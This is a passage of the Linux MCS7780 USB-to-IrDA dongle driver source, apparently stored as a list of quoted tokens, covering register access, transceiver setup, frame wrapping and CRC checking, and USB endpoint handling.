"*", "Brian", "Pugh", "<", "bpugh", "@", "cs", ".", "pdx", ".", "edu", ">", "*", "Judy", "Fischbach", "<", "jfisch", "@", "cs", ".", "pdx", ".", "edu", ">", "*", "*", "Based", "on", "stir4200", "driver", ",", "but", "some", "things", "done", "differently", ".", "*", "Based", "on", "earlier", "driver", "by", "Paul", "Stewart", "<", "stewart", "@", "parc", ".", "com", ">", "*", "*", "Copyright", "(", "C", ")", "2000", ",", "Roman", "Weissgaerber", "<", "weissg", "@", "vienna", ".", "at", ">", "*", "Copyright", "(", "C", ")", "2001", ",", "Dag", "Brattli", "<", "dag", "@", "brattli", ".", "net", ">", "*", "Copyright", "(", "C", ")", "2001", ",", "Jean", "Tourrilhes", "<", "jt", "@", "hpl", ".", "hp", ".", "com", ">", "*", "Copyright", "(", "C", ")", "2004", ",", "Stephen", "Hemminger", "<", "shemminger", "@", "osdl", ".", "org", ">", "*", "Copyright", "(", "C", ")", "2005", ",", "Lukasz", "Stelmach", "<", "stlman", "@", "poczta", ".", "fm", ">", "*", "Copyright", "(", "C", ")", "2005", ",", "Brian", "Pugh", "<", "bpugh", "@", "cs", ".", "pdx", ".", "edu", ">", "*", "Copyright", "(", "C", ")", "2005", ",", "Judy", "Fischbach", "<", "jfisch", "@", "cs", ".", "pdx", ".", "edu", ">", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "*", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "published", "by", "*", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "the", "License", ",", "or", "*", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "*", "but", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "*", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "*", "GNU", "General", "Public", "License", "for", "more", "details", ".", "*", "*", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "*", "along", "with", "this", "program", ";", "if", "not", ",", "write", "to", "the", "Free", "Software", "*", "Foundation", ",", "Inc", ".", ",", "675", "Mass", "Ave", ",", "Cambridge", ",", "MA", "02139", ",", "USA", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "/", "/", "*", "*", "MCS7780", "is", "a", "simple", "USB", "to", "IrDA", "bridge", "by", "MosChip", ".", "It", "is", "neither", "*", "compatibile", "with", "irda", "-", "usb", "nor", "with", "stir4200", ".", "Although", "it", "is", "quite", "*", "similar", "to", "the", "later", "as", "far", "as", "general", "idea", "of", "operation", "is", "concerned", ".", "*", "That", "is", "it", "requires", "the", "software", "to", "do", "all", "the", "framing", "job", "at", "SIR", "speeds", ".", "*", "The", "hardware", "does", "take", "care", "of", "the", "framing", "at", "MIR", "and", "FIR", "speeds", ".", "*", "It", "supports", "all", "speeds", "from", "2400", "through", "4Mbps", "*", "/", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "moduleparam", ".", "h", ">", "#", "include", "<", "linux", "/", "kernel", ".", "h", ">", "#", "include", "<", "linux", "/", "types", ".", "h", ">", "#", "include", "<", "linux", "/", "errno", ".", "h", ">", "#", "include", "<", "linux", "/", "slab", ".", "h", ">", "#", "include", "<", "linux", "/", "usb", ".", "h", ">", "#", "include", "<", "linux", "/", "device", ".", "h", ">", "#", "include", "<", "linux", "/", "crc32", ".", "h", ">", "#", "include", "<", "asm", "/", "unaligned", ".", "h", ">", "#", "include", "<", "asm", "/", "byteorder", ".", "h", ">", "#", "include", "<", "linux", "/", "uaccess", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "wrapper", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "crc", ".", "h", ">", "#", "include", "\"", "mcs7780", ".", "h", "\"", "#", "define", "MCS_VENDOR_ID", "0x9710", "#", "define", "MCS_PRODUCT_ID", "0x7780", "static", "const", "struct", "usb_device_id", "mcs_table", "[", "]", "=", "{", "/", "*", "MosChip", "Corp", ".", ",", "MCS7780", "FIR", "-", "USB", "Adapter", "*", "/", "{", "USB_DEVICE", "(", "MCS_VENDOR_ID", ",", "MCS_PRODUCT_ID", ")", "},", "{", "},", "}", ";", "MODULE_AUTHOR", "(", "\"", "Brian", "Pugh", "<", "bpugh", "@", "cs", ".", "pdx", ".", "edu", ">", "\")", ";", "MODULE_DESCRIPTION", "(", "\"", "IrDA", "-", "USB", "Dongle", "Driver", "for", "MosChip", "MCS7780", "\"", ");", "MODULE_VERSION", "(", "\"", "0", ".", "3alpha", "\"", ");", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "MODULE_DEVICE_TABLE", "(", "usb", ",", "mcs_table", ")", ";", "static", "int", "qos_mtt_bits", "=", "0x07", "/", "*", ">", "1ms", "*", "/", ";", "module_param", "(", "qos_mtt_bits", ",", "int", ",", "0", ")", ";", "MODULE_PARM_DESC", "(", "qos_mtt_bits", ",", "\"", "Minimum", "Turn", "Time", "\"", ");", "static", "int", "receive_mode", "=", "0x1", ";", "module_param", "(", "receive_mode", ",", "int", ",", "0", ")", ";", "MODULE_PARM_DESC", "(", "receive_mode", ",", "\"", "Receive", "mode", "of", "the", "device", "(", "1", ":", "fast", ",", "0", ":", "slow", ",", "default", ":", "1", ")", "\")", ";", "static", "int", "sir_tweak", "=", "1", ";", "module_param", "(", "sir_tweak", ",", "int", ",", "0444", ")", ";", "MODULE_PARM_DESC", "(", "sir_tweak", ",", "\"", "Default", "pulse", "width", "(", "1", ":", "1", ".", "6us", ",", "0", ":", "3", "/", "16", "bit", ",", "default", ":", "1", ")", ".\"", ");", "static", "int", "transceiver_type", "=", "MCS_TSC_VISHAY", ";", "module_param", "(", "transceiver_type", ",", "int", ",", "0444", ")", ";", "MODULE_PARM_DESC", "(", "transceiver_type", ",", "\"", "IR", "transceiver", "type", ",", "see", "mcs7780", ".", "h", ".", "\")", ";", "static", "struct", "usb_driver", "mcs_driver", "=", "{", ".", "name", "=", "\"", "mcs7780", "\"", ",", ".", "probe", "=", "mcs_probe", ",", ".", "disconnect", "=", "mcs_disconnect", ",", ".", "id_table", "=", "mcs_table", ",", "}", ";", "/", "*", "speed", "flag", "selection", "by", "direct", "addressing", ".", "addr", "=", "(", "speed", ">", ">", "8", ")", "&", "0x0f", "0x1", "57600", "0x2", "115200", "0x4", "1152000", "0x5", "9600", "0x6", "38400", "0x9", "2400", "0xa", "576000", "0xb", "19200", "4Mbps", "(", "or", "2400", ")", "must", "be", "checked", "separately", ".", "Since", "it", "also", "has", "to", "be", "programmed", "in", "a", "different", "manner", "that", "is", "not", "a", "big", "problem", ".", "*", "/", "static", "__u16", "mcs_speed_set", "[", "16", "]", "=", "{", "0", ",", "MCS_SPEED_57600", ",", "MCS_SPEED_115200", ",", "0", ",", "MCS_SPEED_1152000", ",", "MCS_SPEED_9600", ",", "MCS_SPEED_38400", ",", "0", ",", "0", ",", "MCS_SPEED_2400", ",", "MCS_SPEED_576000", ",", "MCS_SPEED_19200", ",", "0", ",", "0", ",", "0", ",", "}", ";", "/", "*", "Set", "given", "16", "bit", "register", "with", "a", "16", "bit", "value", ".", "Send", "control", "message", "*", "to", "set", "dongle", "register", ".", "*", "/", "static", "int", "mcs_set_reg", "(", "struct", "mcs_cb", "*", "mcs", ",", "__u16", "reg", ",", "__u16", "val", ")", "{", "struct", "usb_device", "*", "dev", "=", "mcs", "-", ">", "usbdev", ";", "return", "usb_control_msg", "(", "dev", ",", "usb_sndctrlpipe", "(", "dev", ",", "0", ")", ",", "MCS_WRREQ", ",", "MCS_WR_RTYPE", ",", "val", ",", "reg", ",", "NULL", ",", "0", ",", "msecs_to_jiffies", "(", "MCS_CTRL_TIMEOUT", ")", ");", "}", "/", "*", "Get", "16", "bit", "register", "value", ".", "Send", "contol", "message", "to", "read", "dongle", "register", ".", "*", "/", "static", "int", "mcs_get_reg", "(", "struct", "mcs_cb", "*", "mcs", ",", "__u16", "reg", ",", "__u16", "*", "val", ")", "{", "struct", "usb_device", "*", "dev", "=", "mcs", "-", ">", "usbdev", ";", "void", "*", "dmabuf", ";", "int", "ret", ";", "dmabuf", "=", "kmalloc", "(", "sizeof", "(", "__u16", ")", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "dmabuf", ")", "return", "-", "ENOMEM", ";", "ret", "=", "usb_control_msg", "(", "dev", ",", "usb_rcvctrlpipe", "(", "dev", ",", "0", ")", ",", "MCS_RDREQ", ",", "MCS_RD_RTYPE", ",", "0", ",", "reg", ",", "dmabuf", ",", "2", ",", "msecs_to_jiffies", "(", "MCS_CTRL_TIMEOUT", ")", ");", "memcpy", "(", "val", ",", "dmabuf", ",", "sizeof", "(", "__u16", ")", ");", "kfree", "(", "dmabuf", ")", ";", "return", "ret", ";", "}", "/", "*", "Setup", "a", "communication", "between", "mcs7780", "and", "TFDU", "chips", ".", "It", "is", "described", "*", "in", "more", "detail", "in", "the", "data", "sheet", ".", "The", "setup", "sequence", "puts", "the", "the", "*", "vishay", "tranceiver", "into", "high", "speed", "mode", ".", "It", "will", "also", "receive", "SIR", "speed", "*", "packets", "but", "at", "reduced", "sensitivity", ".", "*", "/", "/", "*", "0", ":", "OK", "1", ":", "ERROR", "*", "/", "static", "inline", "int", "mcs_setup_transceiver_vishay", "(", "struct", "mcs_cb", "*", "mcs", ")", "{", "int", "ret", "=", "0", ";", "__u16", "rval", ";", "/", "*", "mcs_get_reg", "should", "read", "exactly", "two", "bytes", "from", "the", "dongle", "*", "/", "ret", "=", "mcs_get_reg", "(", "mcs", ",", "MCS_XCVR_REG", ",", "&", "rval", ")", ";", "if", "(", "unlikely", "(", "ret", "!", "=", "2", ")", ")", "{", "ret", "=", "-", "EIO", ";", "goto", "error", ";", "}", "/", "*", "The", "MCS_XCVR_CONF", "bit", "puts", "the", "transceiver", "into", "configuration", "*", "mode", ".", "The", "MCS_MODE0", "bit", "must", "start", "out", "high", "(", "1", ")", "and", "then", "*", "transition", "to", "low", "and", "the", "MCS_STFIR", "and", "MCS_MODE1", "bits", "must", "*", "be", "low", ".", "*", "/", "rval", "|", "=", "(", "MCS_MODE0", "|", "MCS_XCVR_CONF", ")", ";", "rval", "&", "=", "~", "MCS_STFIR", ";", "rval", "&", "=", "~", "MCS_MODE1", ";", "ret", "=", "mcs_set_reg", "(", "mcs", ",", "MCS_XCVR_REG", ",", "rval", ")", ";", "if", "(", "unlikely", "(", "ret", ")", ")", "goto", "error", ";", "rval", "&", "=", "~", "MCS_MODE0", ";", "ret", "=", "mcs_set_reg", "(", "mcs", ",", "MCS_XCVR_REG", ",", "rval", ")", ";", "if", "(", "unlikely", "(", "ret", ")", ")", "goto", "error", ";", "rval", "&", "=", "~", "MCS_XCVR_CONF", ";", "ret", "=", "mcs_set_reg", "(", "mcs", ",", "MCS_XCVR_REG", ",", "rval", ")", ";", "if", "(", "unlikely", "(", "ret", ")", ")", "goto", "error", ";", "ret", "=", "0", ";", "error", ":", "return", "ret", ";", "}", "/", "*", "Setup", "a", "communication", "between", "mcs7780", "and", "agilent", "chip", ".", "*", "/", "static", "inline", "int", "mcs_setup_transceiver_agilent", "(", "struct", "mcs_cb", "*", "mcs", ")", "{", "net_warn_ratelimited", "(", "\"", "This", "transceiver", "type", "is", "not", "supported", "yet", "\\", "n", "\"", ");", "return", "1", ";", "}", "/", "*", "Setup", "a", "communication", "between", "mcs7780", "and", "sharp", "chip", ".", "*", "/", "static", "inline", "int", "mcs_setup_transceiver_sharp", "(", "struct", "mcs_cb", "*", "mcs", ")", "{", "net_warn_ratelimited", "(", "\"", "This", "transceiver", "type", "is", "not", "supported", "yet", "\\", "n", "\"", ");", "return", "1", ";", "}", "/", "*", "Common", "setup", "for", "all", "transceivers", "*", "/", "static", "inline", "int", "mcs_setup_transceiver", "(", "struct", "mcs_cb", "*", "mcs", ")", "{", "int", "ret", "=", "0", ";", "__u16", "rval", ";", "const", "char", "*", "msg", ";", "msg", "=", "\"", "Basic", "transceiver", "setup", "error", "\"", ";", "/", "*", "read", "value", "of", "MODE", "Register", ",", "set", "the", "DRIVER", "and", "RESET", "bits", "*", "and", "write", "value", "back", "out", "to", "MODE", "Register", "*", "/", "ret", "=", "mcs_get_reg", "(", "mcs", ",", "MCS_MODE_REG", ",", "&", "rval", ")", ";", "if", "(", "unlikely", "(", "ret", "!", "=", "2", ")", ")", "goto", "error", ";", "rval", "|", "=", "MCS_DRIVER", ";", "/", "*", "put", "the", "mcs7780", "into", "configuration", "mode", ".", "*", "/", "ret", "=", "mcs_set_reg", "(", "mcs", ",", "MCS_MODE_REG", ",", "rval", ")", ";", "if", "(", "unlikely", "(", "ret", ")", ")", "goto", "error", ";", "rval", "=", "0", ";", "/", "*", "set", "min", "pulse", "width", "to", "0", "initially", ".", "*", "/", "ret", "=", "mcs_set_reg", "(", "mcs", ",", "MCS_MINRXPW_REG", ",", "rval", ")", ";", "if", "(", "unlikely", "(", "ret", ")", ")", "goto", "error", ";", "ret", "=", "mcs_get_reg", "(", "mcs", ",", "MCS_MODE_REG", ",", "&", "rval", ")", ";", "if", "(", "unlikely", "(", "ret", "!", "=", "2", ")", ")", "goto", "error", ";", "rval", "&", "=", "~", "MCS_FIR", ";", "/", "*", "turn", "off", "fir", "mode", ".", "*", "/", "if", "(", "mcs", "-", ">", "sir_tweak", ")", "rval", "|", "=", "MCS_SIR16US", ";", "/", "*", "1", ".", "6us", "pulse", "width", "*", "/", "else", "rval", "&", "=", "~", "MCS_SIR16US", ";", "/", "*", "3", "/", "16", "bit", "time", "pulse", "width", "*", "/", "/", "*", "make", "sure", "ask", "mode", "and", "back", "to", "back", "packets", "are", "off", ".", "*", "/", "rval", "&", "=", "~", "(", "MCS_BBTG", "|", "MCS_ASK", ")", ";", "rval", "&", "=", "~", "MCS_SPEED_MASK", ";", "rval", "|", "=", "MCS_SPEED_9600", ";", "/", "*", "make", "sure", "initial", "speed", "is", "9600", ".", "*", "/", "mcs", "-", ">", "speed", "=", "9600", ";", "mcs", "-", ">", "new_speed", "=", "0", ";", "/", "*", "new_speed", "is", "set", "to", "0", "*", "/", "rval", "&", "=", "~", "MCS_PLLPWDN", ";", "/", "*", "disable", "power", "down", ".", "*", "/", "/", "*", "make", "sure", "device", "determines", "direction", "and", "that", "the", "auto", "send", "sip", "*", "pulse", "are", "on", ".", "*", "/", "rval", "|", "=", "MCS_DTD", "|", "MCS_SIPEN", ";", "ret", "=", "mcs_set_reg", "(", "mcs", ",", "MCS_MODE_REG", ",", "rval", ")", ";", "if", "(", "unlikely", "(", "ret", ")", ")", "goto", "error", ";", "msg", "=", "\"", "transceiver", "model", "specific", "setup", "error", "\"", ";", "switch", "(", "mcs", "-", ">", "transceiver_type", ")", "{", "case", "MCS_TSC_VISHAY", ":", "ret", "=", "mcs_setup_transceiver_vishay", "(", "mcs", ")", ";", "break", ";", "case", "MCS_TSC_SHARP", ":", "ret", "=", "mcs_setup_transceiver_sharp", "(", "mcs", ")", ";", "break", ";", "case", "MCS_TSC_AGILENT", ":", "ret", "=", "mcs_setup_transceiver_agilent", "(", "mcs", ")", ";", "break", ";", "default", ":", "net_warn_ratelimited", "(", "\"", "Unknown", "transceiver", "type", ":", "%", "d", "\\", "n", "\"", ",", "mcs", "-", ">", "transceiver_type", ")", ";", "ret", "=", "1", ";", "}", "if", "(", "unlikely", "(", "ret", ")", ")", "goto", "error", ";", "/", "*", "If", "transceiver", "is", "not", "SHARP", ",", "then", "if", "receive", "mode", "set", "*", "on", "the", "RXFAST", "bit", "in", "the", "XCVR", "Register", "otherwise", "unset", "it", "*", "/", "if", "(", "mcs", "-", ">", "transceiver_type", "!", "=", "MCS_TSC_SHARP", ")", "{", "ret", "=", "mcs_get_reg", "(", "mcs", ",", "MCS_XCVR_REG", ",", "&", "rval", ")", ";", "if", "(", "unlikely", "(", "ret", "!", "=", "2", ")", ")", "goto", "error", ";", "if", "(", "mcs", "-", ">", "receive_mode", ")", "rval", "|", "=", "MCS_RXFAST", ";", "else", "rval", "&", "=", "~", "MCS_RXFAST", ";", "ret", "=", "mcs_set_reg", "(", "mcs", ",", "MCS_XCVR_REG", ",", "rval", ")", ";", "if", "(", "unlikely", "(", "ret", ")", ")", "goto", "error", ";", "}", "msg", "=", "\"", "transceiver", "reset", "\"", ";", "ret", "=", "mcs_get_reg", "(", "mcs", ",", "MCS_MODE_REG", ",", "&", "rval", ")", ";", "if", "(", "unlikely", "(", "ret", "!", "=", "2", ")", ")", "goto", "error", ";", "/", "*", "reset", "the", "mcs7780", "so", "all", "changes", "take", "effect", ".", "*", "/", "rval", "&", "=", "~", "MCS_RESET", ";", "ret", "=", "mcs_set_reg", "(", "mcs", ",", "MCS_MODE_REG", ",", "rval", ")", ";", "if", "(", "unlikely", "(", "ret", ")", ")", "goto", "error", ";", "else", "return", "ret", ";", "error", ":", "net_err_ratelimited", "(", "\"%", "s", "\\", "n", "\"", ",", "msg", ")", ";", "return", "ret", ";", "}", "/", "*", "Wraps", "the", "data", "in", "format", "for", "SIR", "*", "/", "static", "inline", "int", "mcs_wrap_sir_skb", "(", "struct", "sk_buff", "*", "skb", ",", "__u8", "*", "buf", ")", "{", "int", "wraplen", ";", "/", "*", "2", ":", "full", "frame", "length", ",", "including", "\"", "the", "length", "\"", "*", "/", "wraplen", "=", "async_wrap_skb", "(", "skb", ",", "buf", "+", "2", ",", "4094", ")", ";", "wraplen", "+", "=", "2", ";", "buf", "[", "0", "]", "=", "wraplen", "&", "0xff", ";", "buf", "[", "1", "]", "=", "(", "wraplen", ">", ">", "8", ")", "&", "0xff", ";", "return", "wraplen", ";", "}", "/", "*", "Wraps", "the", "data", "in", "format", "for", "FIR", "*", "/", "static", "unsigned", "mcs_wrap_fir_skb", "(", "const", "struct", "sk_buff", "*", "skb", ",", "__u8", "*", "buf", ")", "{", "unsigned", "int", "len", "=", "0", ";", "__u32", "fcs", "=", "~", "(", "crc32_le", "(", "~", "0", ",", "skb", "-", ">", "data", ",", "skb", "-", ">", "len", ")", ");", "/", "*", "add", "2", "bytes", "for", "length", "value", "and", "4", "bytes", "for", "fcs", ".", "*", "/", "len", "=", "skb", "-", ">", "len", "+", "6", ";", "/", "*", "The", "mcs7780", "requires", "that", "the", "first", "two", "bytes", "are", "the", "packet", "*", "length", "in", "little", "endian", "order", ".", "Note", ":", "the", "length", "value", "includes", "*", "the", "two", "bytes", "for", "the", "length", "value", "itself", ".", "*", "/", "buf", "[", "0", "]", "=", "len", "&", "0xff", ";", "buf", "[", "1", "]", "=", "(", "len", ">", ">", "8", ")", "&", "0xff", ";", "/", "*", "copy", "the", "data", "into", "the", "tx", "buffer", ".", "*", "/", "skb_copy_from_linear_data", "(", "skb", ",", "buf", "+", "2", ",", "skb", "-", ">", "len", ")", ";", "/", "*", "put", "the", "fcs", "in", "the", "last", "four", "bytes", "in", "little", "endian", "order", ".", "*", "/", "buf", "[", "len", "-", "4", "]", "=", "fcs", "&", "0xff", ";", "buf", "[", "len", "-", "3", "]", "=", "(", "fcs", ">", ">", "8", ")", "&", "0xff", ";", "buf", "[", "len", "-", "2", "]", "=", "(", "fcs", ">", ">", "16", ")", "&", "0xff", ";", "buf", "[", "len", "-", "1", "]", "=", "(", "fcs", ">", ">", "24", ")", "&", "0xff", ";", "return", "len", ";", "}", "/", "*", "Wraps", "the", "data", "in", "format", "for", "MIR", "*", "/", "static", "unsigned", "mcs_wrap_mir_skb", "(", "const", "struct", "sk_buff", "*", "skb", ",", "__u8", "*", "buf", ")", "{", "__u16", "fcs", "=", "0", ";", "int", "len", "=", "skb", "-", ">", "len", "+", "4", ";", "fcs", "=", "~", "(", "irda_calc_crc16", "(", "~", "fcs", ",", "skb", "-", ">", "data", ",", "skb", "-", ">", "len", ")", ");", "/", "*", "put", "the", "total", "packet", "length", "in", "first", ".", "Note", ":", "packet", "length", "*", "value", "includes", "the", "two", "bytes", "that", "hold", "the", "packet", "length", "*", "itself", ".", "*", "/", "buf", "[", "0", "]", "=", "len", "&", "0xff", ";", "buf", "[", "1", "]", "=", "(", "len", ">", ">", "8", ")", "&", "0xff", ";", "/", "*", "copy", "the", "data", "*", "/", "skb_copy_from_linear_data", "(", "skb", ",", "buf", "+", "2", ",", "skb", "-", ">", "len", ")", ";", "/", "*", "put", "the", "fcs", "in", "last", "two", "bytes", "in", "little", "endian", "order", ".", "*", "/", "buf", "[", "len", "-", "2", "]", "=", "fcs", "&", "0xff", ";", "buf", "[", "len", "-", "1", "]", "=", "(", "fcs", ">", ">", "8", ")", "&", "0xff", ";", "return", "len", ";", "}", "/", "*", "Unwrap", "received", "packets", "at", "MIR", "speed", ".", "A", "16", "bit", "crc_ccitt", "checksum", "is", "*", "used", "for", "the", "fcs", ".", "When", "performed", "over", "the", "entire", "packet", "the", "result", "*", "should", "be", "GOOD_FCS", "=", "0xf0b8", ".", "Hands", "the", "unwrapped", "data", "off", "to", "the", "IrDA", "*", "layer", "via", "a", "sk_buff", ".", "*", "/", "static", "void", "mcs_unwrap_mir", "(", "struct", "mcs_cb", "*", "mcs", ",", "__u8", "*", "buf", ",", "int", "len", ")", "{", "__u16", "fcs", ";", "int", "new_len", ";", "struct", "sk_buff", "*", "skb", ";", "/", "*", "Assume", "that", "the", "frames", "are", "going", "to", "fill", "a", "single", "packet", "*", "rather", "than", "span", "multiple", "packets", ".", "*", "/", "new_len", "=", "len", "-", "2", ";", "if", "(", "unlikely", "(", "new_len", "<", "=", "0", ")", ")", "{", "net_err_ratelimited", "(", "\"%", "s", "short", "frame", "length", "%", "d", "\\", "n", "\"", ",", "mcs", "-", ">", "netdev", "-", ">", "name", ",", "new_len", ")", ";", "+", "+", "mcs", "-", ">", "netdev", "-", ">", "stats", ".", "rx_errors", ";", "+", "+", "mcs", "-", ">", "netdev", "-", ">", "stats", ".", "rx_length_errors", ";", "return", ";", "}", "fcs", "=", "0", ";", "fcs", "=", "irda_calc_crc16", "(", "~", "fcs", ",", "buf", ",", "len", ")", ";", "if", "(", "fcs", "!", "=", "GOOD_FCS", ")", "{", "net_err_ratelimited", "(", "\"", "crc", "error", "calc", "0x", "%", "x", "len", "%", "d", "\\", "n", "\"", ",", "fcs", ",", "new_len", ")", ";", "mcs", "-", ">", "netdev", "-", ">", "stats", ".", "rx_errors", "+", "+;", "mcs", "-", ">", "netdev", "-", ">", "stats", ".", "rx_crc_errors", "+", "+;", "return", ";", "}", "skb", "=", "dev_alloc_skb", "(", "new_len", "+", "1", ")", ";", "if", "(", "unlikely", "(", "!", "skb", ")", ")", "{", "+", "+", "mcs", "-", ">", "netdev", "-", ">", "stats", ".", "rx_dropped", ";", "return", ";", "}", "skb_reserve", "(", "skb", ",", "1", ")", ";", "skb_copy_to_linear_data", "(", "skb", ",", "buf", ",", "new_len", ")", ";", "skb_put", "(", "skb", ",", "new_len", ")", ";", "skb_reset_mac_header", "(", "skb", ")", ";", "skb", "-", ">", "protocol", "=", "htons", "(", "ETH_P_IRDA", ")", ";", "skb", "-", ">", "dev", "=", "mcs", "-", ">", "netdev", ";", "netif_rx", "(", "skb", ")", ";", "mcs", "-", ">", "netdev", "-", ">", "stats", ".", "rx_packets", "+", "+;", "mcs", "-", ">", "netdev", "-", ">", "stats", ".", "rx_bytes", "+", "=", "new_len", ";", "}", "/", "*", "Unwrap", "received", "packets", "at", "FIR", "speed", ".", "A", "32", "bit", "crc_ccitt", "checksum", "is", "*", "used", "for", "the", "fcs", ".", "Hands", "the", "unwrapped", "data", "off", "to", "the", "IrDA", "*", "layer", "via", "a", "sk_buff", ".", "*", "/", "static", "void", "mcs_unwrap_fir", "(", "struct", "mcs_cb", "*", "mcs", ",", "__u8", "*", "buf", ",", "int", "len", ")", "{", "__u32", "fcs", ";", "int", "new_len", ";", "struct", "sk_buff", "*", "skb", ";", "/", "*", "Assume", "that", "the", "frames", "are", "going", "to", "fill", "a", "single", "packet", "*", "rather", "than", "span", "multiple", "packets", ".", "This", "is", "most", "likely", "a", "false", "*", "assumption", ".", "*", "/", "new_len", "=", "len", "-", "4", ";", "if", "(", "unlikely", "(", "new_len", "<", "=", "0", ")", ")", "{", "net_err_ratelimited", "(", "\"%", "s", "short", "frame", "length", "%", "d", "\\", "n", "\"", ",", "mcs", "-", ">", "netdev", "-", ">", "name", ",", "new_len", ")", ";", "+", "+", "mcs", "-", ">", "netdev", "-", ">", "stats", ".", "rx_errors", ";", "+", "+", "mcs", "-", ">", "netdev", "-", ">", "stats", ".", "rx_length_errors", ";", "return", ";", "}", "fcs", "=", "~", "(", "crc32_le", "(", "~", "0", ",", "buf", ",", "new_len", ")", ");", "if", "(", "fcs", "!", "=", "get_unaligned_le32", "(", "buf", "+", "new_len", ")", ")", "{", "net_err_ratelimited", "(", "\"", "crc", "error", "calc", "0x", "%", "x", "len", "%", "d", "\\", "n", "\"", ",", "fcs", ",", "new_len", ")", ";", "mcs", "-", ">", "netdev", "-", ">", "stats", ".", "rx_errors", "+", "+;", "mcs", "-", ">", "netdev", "-", ">", "stats", ".", "rx_crc_errors", "+", "+;", "return", ";", "}", "skb", "=", "dev_alloc_skb", "(", "new_len", "+", "1", ")", ";", "if", "(", "unlikely", "(", "!", "skb", ")", ")", "{", "+", "+", "mcs", "-", ">", "netdev", "-", ">", "stats", ".", "rx_dropped", ";", "return", ";", "}", "skb_reserve", "(", "skb", ",", "1", ")", ";", "skb_copy_to_linear_data", "(", "skb", ",", "buf", ",", "new_len", ")", ";", "skb_put", "(", "skb", ",", "new_len", ")", ";", "skb_reset_mac_header", "(", "skb", ")", ";", "skb", "-", ">", "protocol", "=", "htons", "(", "ETH_P_IRDA", ")", ";", "skb", "-", ">", "dev", "=", "mcs", "-", ">", "netdev", ";", "netif_rx", "(", "skb", ")", ";", "mcs", "-", ">", "netdev", "-", ">", "stats", ".", "rx_packets", "+", "+;", "mcs", "-", ">", "netdev", "-", ">", "stats", ".", "rx_bytes", "+", "=", "new_len", ";", "}", "/", "*", "Allocates", "urbs", "for", "both", "receive", "and", "transmit", ".", "*", "If", "alloc", "fails", "return", "error", "code", "0", "(", "fail", ")", "otherwise", "*", "return", "error", "code", "1", "(", "success", ")", ".", "*", "/", "static", "inline", "int", "mcs_setup_urbs", "(", "struct", "mcs_cb", "*", "mcs", ")", "{", "mcs", "-", ">", "rx_urb", "=", "NULL", ";", "mcs", "-", ">", "tx_urb", "=", "usb_alloc_urb", "(", "0", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "mcs", "-", ">", "tx_urb", ")", "return", "0", ";", "mcs", "-", ">", "rx_urb", "=", "usb_alloc_urb", "(", "0", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "mcs", "-", ">", "rx_urb", ")", "{", "usb_free_urb", "(", "mcs", "-", ">", "tx_urb", ")", ";", "mcs", "-", ">", "tx_urb", "=", "NULL", ";", "return", "0", ";", "}", "return", "1", ";", "}", "/", "*", "Sets", "up", "state", "to", "be", "initially", "outside", "frame", ",", "gets", "receive", "urb", ",", "*", "sets", "status", "to", "successful", "and", "then", "submits", "the", "urb", "to", "start", "*", "receiving", "the", "data", ".", "*", "/", "static", "inline", "int", "mcs_receive_start", "(", "struct", "mcs_cb", "*", "mcs", ")", "{", "mcs", "-", ">", "rx_buff", ".", "in_frame", "=", "FALSE", ";", "mcs", "-", ">", "rx_buff", ".", "state", "=", "OUTSIDE_FRAME", ";", "usb_fill_bulk_urb", "(", "mcs", "-", ">", "rx_urb", ",", "mcs", "-", ">", "usbdev", ",", "usb_rcvbulkpipe", "(", "mcs", "-", ">", "usbdev", ",", "mcs", "-", ">", "ep_in", ")", ",", "mcs", "-", ">", "in_buf", ",", "4096", ",", "mcs_receive_irq", ",", "mcs", ")", ";", "mcs", "-", ">", "rx_urb", "-", ">", "status", "=", "0", ";", "return", "usb_submit_urb", "(", "mcs", "-", ">", "rx_urb", ",", "GFP_KERNEL", ")", ";", "}", "/", "*", "Finds", "the", "in", "and", "out", "endpoints", "for", "the", "mcs", "control", "block", "*", "/", "static", "inline", "int", "mcs_find_endpoints", "(", "struct", "mcs_cb", "*", "mcs", ",", "struct", "usb_host_endpoint", "*", "ep", ",", "int", "epnum", ")", "{", "int", "i", ";", "int", "ret", "=", "0", ";", "/", "*", "If", "no", "place", "to", "store", "the", "endpoints", "just", "return", "*", "/", "if", "(", "!", "ep", ")", "return", "ret", ";", "/", "*", "cycle", "through", "all", "endpoints", ",", "find", "the", "first", "two", "that", "are", "DIR_IN", "*", "/", "for", "(", "i", "=", "0", ";", "i", "<", "epnum", ";", "i", "+", "+)", "{", "if", "(", "ep", "[", "i", "]", ".", "desc", ".", "bEndpointAddress", "&", "USB_DIR_IN", ")", "mcs", "-", ">", "ep_in", "=", "ep", "[", "i", "]", ".", "desc", ".", "bEndpointAddress", ";", "else", "mcs", "-", ">", "ep_out", "=", "ep", "[", "i", "]", ".", "desc", ".", "bEndpointAddress", ";", "/", "*", "MosChip", "says", "that", "the", "chip", "has", "only", "two", "bulk", "*", "endpoints", ".", "Find", "one", "for", "each", "direction", "and", "move", "on", ".", "*", "/", "if", "(", "(", "mcs", "-", ">", "ep_in", "!", "=", "0", ")", "&", "&", "(", "mcs", "-", ">", "ep_out", "!", "=", "0", ")", ")", "{", "ret", "=", "1", ";", "break", ";", "}", "}", "return", "ret", ";", "}", "static", "void", "mcs_speed_work", "(", "struct", "work_struct", 